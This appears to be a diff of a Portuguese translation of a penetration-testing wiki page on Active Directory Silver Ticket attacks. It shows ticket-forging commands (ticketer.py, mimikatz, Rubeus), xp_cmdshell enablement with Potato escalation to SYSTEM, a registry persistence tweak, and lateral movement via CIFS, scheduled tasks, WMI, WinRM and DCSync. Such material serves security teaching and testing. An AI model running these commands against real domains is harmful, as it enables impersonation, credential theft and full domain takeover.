@@ -6,15 +6,15 @@
 
 ## Silver ticket
 
-O ataque **Silver Ticket** envolve a exploração de service tickets em ambientes Active Directory (AD). Este método depende de **adquirir o NTLM hash de uma service account**, como uma computer account, para forjar um Ticket Granting Service (TGS) ticket. Com esse ticket forjado, um atacante pode acessar serviços específicos na rede, **se passando por qualquer usuário**, tipicamente visando privilégios administrativos. Enfatiza-se que usar AES keys para forjar tickets é mais seguro e menos detectável.
+O ataque **Silver Ticket** envolve a exploração de service tickets em ambientes Active Directory (AD). Este método baseia-se em **adquirir o NTLM hash de uma service account**, como uma computer account, para forjar um Ticket Granting Service (TGS) ticket. Com esse ticket forjado, um atacante pode acessar serviços específicos na rede, **impersonando qualquer usuário**, tipicamente visando privilégios administrativos. É enfatizado que usar AES keys para forjar tickets é mais seguro e menos detectável.
 
 > [!WARNING]
-> Silver Tickets são menos detectáveis do que Golden Tickets porque requerem apenas o **hash da service account**, não a krbtgt account. No entanto, eles são limitados ao serviço específico que atacam. Além disso, apenas roubar a senha de um usuário.
-> Além disso, se você comprometer a **senha de uma conta com um SPN** você pode usar essa senha para criar um Silver Ticket passando-se por qualquer usuário para esse serviço.
+> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
+> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
 
-Para a criação de tickets, diferentes ferramentas são empregadas conforme o sistema operacional:
+For ticket crafting, different tools are employed based on the operating system:
 
-### No Linux
+### On Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -39,9 +39,9 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 ```
 O serviço CIFS é destacado como um alvo comum para acessar o sistema de arquivos da vítima, mas outros serviços como HOST e RPCSS também podem ser explorados para tarefas e consultas WMI.
 
-### Exemplo: MSSQL service (MSSQLSvc) + Potato to SYSTEM
+### Exemplo: serviço MSSQL (MSSQLSvc) + Potato para SYSTEM
 
-Se você tiver o NTLM hash (ou AES key) de uma conta de serviço SQL (por exemplo, sqlsvc) você pode forjar um TGS para o MSSQL SPN e impersonar qualquer usuário perante o serviço SQL. A partir daí, habilite xp_cmdshell para executar comandos como a conta de serviço SQL. Se esse token tiver SeImpersonatePrivilege, você pode encadear um Potato para elevar para SYSTEM.
+Se você tiver o hash NTLM (ou a chave AES) de uma conta de serviço SQL (por exemplo, sqlsvc), você pode forjar um TGS para o SPN MSSQL e fazer impersonate de qualquer usuário no serviço SQL. A partir daí, habilite xp_cmdshell para executar comandos como a conta de serviço SQL. Se esse token tiver SeImpersonatePrivilege, encadeie um Potato para elevar-se a SYSTEM.
 ```bash
 # Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
 python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -52,7 +52,7 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Se o contexto resultante tiver SeImpersonatePrivilege (frequentemente verdadeiro para contas de serviço), use uma variante de Potato para obter SYSTEM:
+- Se o contexto resultante tiver SeImpersonatePrivilege (frequentemente verdadeiro para service accounts), use uma variante de Potato para obter SYSTEM:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
@@ -73,11 +73,11 @@ Visão geral das técnicas Potato:
 
 ## Serviços Disponíveis
 
-| Tipo de Serviço                             | Serviço (Silver Tickets)                                                   |
+| Service Type                               | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependendo do SO também:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Em algumas ocasiões você pode simplesmente solicitar: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
 | Windows File Share, also psexec            | CIFS                                                                       |
 | LDAP operations, included DCSync           | LDAP                                                                       |
@@ -88,7 +88,7 @@ Usando **Rubeus** você pode **solicitar todos** esses tickets usando o parâmet
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets - IDs de Evento
+### Silver tickets IDs de Evento
 
 - 4624: Logon de Conta
 - 4634: Logoff de Conta
@@ -96,11 +96,11 @@ Usando **Rubeus** você pode **solicitar todos** esses tickets usando o parâmet
 
 ## Persistência
 
-Para evitar que as máquinas rotacionem sua senha a cada 30 dias, defina `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou você pode definir `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` para um valor maior que 30 dias para indicar o período de rotação quando a senha da máquina deve ser alterada.
+Para evitar que as máquinas rotacionem sua senha a cada 30 dias, defina `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou você pode definir `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` para um valor maior que 30days para indicar o período de rotação quando a senha da máquina deve ser rotacionada.
 
 ## Abusando de Service tickets
 
-Nos exemplos a seguir, vamos imaginar que o ticket foi obtido impersonando a conta de administrador.
+Nos exemplos a seguir, vamos imaginar que o ticket foi obtido se passando pela conta de administrador.
 
 ### CIFS
 
@@ -110,7 +110,7 @@ dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Você também poderá obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:
+Você também poderá obter um shell no host ou executar comandos arbitrários usando **psexec**:
 
 
 {{#ref}}
@@ -119,7 +119,7 @@ Você também poderá obter um shell dentro do host ou executar comandos arbitr�
 
 ### HOST
 
-Com essa permissão você pode criar tarefas agendadas em computadores remotos e executar comandos arbitrários:
+Com essa permissão você pode gerar tarefas agendadas em computadores remotos e executar comandos arbitrários:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -143,7 +143,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Encontre **mais informações sobre wmiexec** na seguinte página:
+Encontre **mais informações sobre wmiexec** na página a seguir:
 
 
 {{#ref}}
@@ -156,22 +156,23 @@ Com acesso winrm a um computador você pode **acessá-lo** e até obter um Power
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Consulte a página a seguir para aprender **mais maneiras de conectar-se a um host remoto usando winrm**:
+Consulte a página a seguir para aprender **mais formas de conectar-se a um host remoto usando winrm**:
+
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Observe que **o winrm deve estar ativo e aceitando conexões** no computador remoto para acessá-lo.
+> Observe que **winrm deve estar ativo e escutando** no computador remoto para acessá-lo.
 
 ### LDAP
 
-Com esse privilégio você pode fazer dump do banco de dados do DC usando **DCSync**:
+Com esse privilégio você pode extrair o banco de dados do DC usando **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**Saiba mais sobre DCSync** na seguinte página:
+**Saiba mais sobre DCSync** na página a seguir:
 
 
 {{#ref}}
